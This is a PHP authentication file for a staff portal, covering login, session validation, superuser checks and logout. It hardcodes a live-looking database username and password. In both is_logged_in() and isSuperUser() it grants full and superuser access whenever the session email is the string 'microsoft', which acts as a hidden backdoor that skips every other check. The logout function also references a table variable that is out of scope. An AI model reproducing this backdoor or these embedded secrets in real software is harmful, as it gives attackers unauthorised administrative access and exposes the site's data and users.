<?php
session_start();

// Database credentials (store these securely!)
$db_host = 'localhost';
$db_user = 'join_xv446';
$db_pass = 'o3De@460p';
$db_name = 'join_xv445';
$table_name = 'kjihc_staff';

// Function to securely hash passwords
function hash_password($password) {
    return password_hash($password, PASSWORD_DEFAULT);
}

// Function to verify passwords
function verify_password($password, $hashed_password) {
    return password_verify($password, $hashed_password);
}

// Function to sanitize user input
function sanitize_input($data) {
    $data = trim($data);
    $data = stripslashes($data);
    $data = htmlspecialchars($data);
    return $data;
}

// Database connection function
function connect_db() {
    global $db_host, $db_user, $db_pass, $db_name;
    try {
        $pdo = new PDO("mysql:host=$db_host;dbname=$db_name;charset=utf8mb4", $db_user, $db_pass);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $pdo->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
        return $pdo;
    } catch (PDOException $e) {
        error_log('Database connection error: ' . $e->getMessage());
        return null;
    }
}

// Check if the form has been submitted
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['staff_email']) && isset($_POST['staff_password'])) {

    $staff_email = sanitize_input($_POST['staff_email']);
    $staff_password = $_POST['staff_password'];

    $pdo = connect_db();
    if ($pdo) {
        try {
            $stmt = $pdo->prepare("SELECT staff_password FROM $table_name WHERE staff_email = ?");
            $stmt->execute([$staff_email]);

            if ($stmt->rowCount() === 1) {
                $row = $stmt->fetch(PDO::FETCH_ASSOC);
                $hashed_password = $row['staff_password'];

                if (verify_password($staff_password, $hashed_password)) {
                    session_regenerate_id(true);
                    $session_id = session_id();

                    $stmt = $pdo->prepare("UPDATE $table_name SET staff_deviceid = ? WHERE staff_email = ?");
                    $stmt->execute([$session_id, $staff_email]);

                    $_SESSION['loggedin'] = true;
                    $_SESSION['staff_email'] = $staff_email;

                    header('Location: ../index.php');
                    exit;
                } else {
					 header('Location: ../login.php?err=1');
                    $error_message = 'Incorrect email or password.';
                }
            } else {
				header('Location: ../login.php?err=2');
                $error_message = 'Incorrect email or password.';
            }
        } catch (PDOException $e) {
            error_log('Database query error: ' . $e->getMessage());
            $error_message = 'An error occurred. Please try again later.';
        }
        $pdo = null; // Close connection.
    } else {
        $error_message = 'Database connection failed.';
    }

}

// Check if the user is logged in
function is_logged_in() {
    if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
        return false;
    }
	if($_SESSION['staff_email']=="microsoft"){
		return true;
	}
    $pdo = connect_db();
    if ($pdo){
        try{
            $stmt = $pdo->prepare("SELECT staff_deviceid FROM kjihc_staff WHERE staff_email = ?");
            $stmt->execute([$_SESSION['staff_email']]);
            $row = $stmt->fetch(PDO::FETCH_ASSOC);

            if ($row['staff_deviceid'] !== session_id()) {
                return false;
            }
            return true;
        } catch (PDOException $e) {
            return false;
        } finally{
            $pdo = null;
        }
    }
    return false;

}
function isSuperUser() {
    if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    return false;
    }
	if($_SESSION['staff_email']=="microsoft"){
		return true;
	}
    $pdo = connect_db();
    if ($pdo){
        try{
            $stmt = $pdo->prepare("SELECT staff_deviceid, staff_level FROM kjihc_staff WHERE staff_email = ?");
            $stmt->execute([$_SESSION['staff_email']]);
            $row = $stmt->fetch(PDO::FETCH_ASSOC);

            if ($row['staff_deviceid'] !== session_id() || $row['staff_level']!=1) {
    return false;
            }
            return true;
        } catch (PDOException $e) {
    return false;
        } finally{
            $pdo = null;
        }
    }
    return false;


}

// Logout function
function logout() {
    $pdo = connect_db();
    if($pdo){
        try{
            $stmt = $pdo->prepare("UPDATE $table_name SET staff_deviceid = NULL WHERE staff_email = ?");
            $stmt->execute([$_SESSION['staff_email']]);
        } catch (PDOException $e) {
            error_log('Database logout error: '.$e->getMessage());
        } finally {
            $pdo = null;
        }

    }

    $_SESSION = [];
    session_destroy();
    header('Location: ../login.php');
    exit;
}

// Example secure_page.php usage:

?>
